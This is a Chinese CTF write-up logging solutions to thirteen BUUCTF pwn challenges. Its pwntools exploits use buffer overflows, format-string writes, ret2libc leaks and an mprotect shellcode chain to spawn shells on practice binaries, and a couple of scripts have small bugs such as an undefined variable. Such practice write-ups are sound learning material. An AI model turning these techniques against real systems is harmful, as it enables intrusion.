# buuctf刷题记录（1-20题）

## 1 test_nc

略

## 2 rip

```python
from pwn import *
p = process('./pwn1')
p.sendline(b'a'*0xF+b'b'*0x8+p64(0x40118a))
p.interactive()
```

## 3 warmup_csaw_2016

```python
from pwn import *
#p = process('./pwn')
p = remote('node5.buuoj.cn',28694)
payload = b'a'*72+p64(0x40060d)
p.sendline(payload)
p.interactive()
```

在本地打了半天以为我有问题，最后想起来system执行的是cat flag，不会有shell

## 4 ciscn_2019_n_1

两种思路，一种是覆盖返回地址，一种是覆盖v2

```python
from pwn import *
p = process('./pwn')
retaddr=0x4006BE
payload=b'a'*56+p32(retaddr)
p.sendline(payload)
p.interactive()
```

```python
from pwn import *
p = process('./pwn')
payload = b'a'*0x2c+p64(0x41348000)	# 可以看ida里面，有写v2的偏移
p.sendline(payload)
p.interactive()
```

## 5 pwn1_sctf_2016

限制了32字节的读入，但是后面的操作会把I变为you，留4字节给esp，输入20个I就行

```python
from pwn import *
p = process('./pwn')
payload = b'I'*20+b'a'*4+p32(0x8048F0D)
p.sendline(payload)
p.interactive()
```

*这次学好了，先在本地创建了一个`flag.txt`的文件*

## 6 jarvisoj_level0

ret2text不多说了(用了下自己的模板，有很多不需要)

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
#p = remote('',)
def dbg():
    gdb.attach(p)
    pause()
payload = b'a'*0x80+b'b'*0x8+p64(0x40059A)

p.sendline(payload)

p.interactive()
```

## 7 [第五空间2019 决赛]PWN5

有一个很好用的pwntools语法：

`fmtstr_payload(number,{addr:value})`

- `number`表示偏移字节数，`addr`为你要写入的地址，`value`为你要更改为的数值

这里分析题目可以发现，我们在buf段溢出，然后覆盖`dword_804C044`，再输入相同的覆盖值就行

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
def dbg():
    gdb.attach(p)
    pause()
p.recvuntil('name:')
payload = fmtstr_payload(11,{0x804C044:0x1})
p.sendline(payload)
p.recvuntil('passwd:')
p.sendline("1")
p.interactive()
```

## 8 jarvisoj_level2

一个32位的题目，和64位有些区别，但不多

**32位`system（）`利用栈传参，不用寄存器**.

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
def dbg():
    gdb.attach(p)
    pause()

sys = 0x8048320	# system的地址
binsh = 0x804A024	#binsh的地址
payload = b'a'*0x88+b'b'*0x4+p32(sys)+p32(1)+p32(binsh)
#垃圾数据+覆盖返回地址(32位是4字节）+system地址调用+随意参数填充+binsh填充
p.sendline(payload)
p.interactive()
```

## 9 ciscn_2019_n_8

可以发现如果var[13]是17就getshell

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
def dbg():
    gdb.attach(p)
    pause()

payload = p32(17)*14
p.sendline(payload)
p.interactive()
```

## 10 bjdctf_2020_babystack

自定义输入长度，栈溢出

```python
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
def dbg():
    gdb.attach(p)
    pause()

p.sendline(b'100')

payload = b'a'*0x10+b'b'*0x8+p64(0x4006EA)
p.sendline(payload)
p.interactive()
```

## 11 ciscn_2019_c_1

ret2libc，加密的地方可以溢出，可以在输入的地方输入一个'\0'绕开加密过程

```python
from pwn import*
from LibcSearcher import*

p=remote('node5.buuoj.cn',26071)
#p = process('./pwn')
elf=ELF('./pwn')

main = 0x400B28
pop_rdi = 0x400c83
ret = 0x4006b9

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

p.sendlineafter('Input your choice!\n','1')
offset = 0x50+8
payload = b'\0'+b'a'*(offset-1)
payload+=p64(pop_rdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(main)
p.sendlineafter('Input your Plaintext to be encrypted\n',payload)
p.recvline()
p.recvline()
puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\0'))
print(hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)
Offset = puts_addr - libc.dump('puts')
binsh = Offset+libc.dump('str_bin_sh')
system = Offset+libc.dump('system')
p.sendlineafter('Input your choice!\n','1')
payload = b'\0'+b'a'*(offset-1)
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system)
p.sendlineafter('Input your Plaintext to be encrypted\n',payload)

p.interactive()
```

## 12 jarvisoj_level2_x64

rdi传递binsh

又是本地打不通，远程可以打通，不理解

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
#p = remote('node5.buuoj.cn',28182)
def dbg():
    gdb.attach(p)
    pause()

pop_rdi = 0x00000000004006b3
binsh = 0x600A90
system = elf.plt['system']
ret = 0x00000000004004a1
p.recv()
payload = b'b'*0x80+b'b'*8+p64(pop_rdi)+p64(binsh)+p64(system)
p.sendline(payload)
p.interactive()
```

## 13 get_started_3dsctf_2016

- 通过mprotect()函数改内存为可读可写可执行

- 加入read函数

- 在read函数中构造shellcode

至于为什么是0x80EB000而不是bss段的开头0x80EBF80。

>  因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('node5.buuoj.cn',25636)
def dbg():
    gdb.attach(p)
    pause()

pop_ret = 0x0804951D# 这里是一个有三个寄存器的pop_ret
mprotect_addr = elf.sym['mprotect']
mem_addr = 0x80EB000
mem_size = 0x1000
mem_proc = 0x7
read_addr = elf.sym['read']

# 调用mprotect函数
payload = b'a'*0x38
payload+=p32(mprotect_addr)
payload+=p32(pop_ret)

# 填充mprotect参数
payload+=p32(mem_addr)
payload+=p32(mem_size)
payload+=p32(mem_proc)

# 调用read函数
payload+=p32(read_addr)
payload+=p32(pop_ret)

# 填充read参数
payload+=p32(0)
payload+=p32(mem_addr)
payload+=p32(0x100)

# read返回后跳转到shellcode所在地址
payload+=p32(mem_addr)

p.sendline(payload)

payload2 = asm(shellcraft.sh())
p.sendline(payload2)
p.interactive()
```

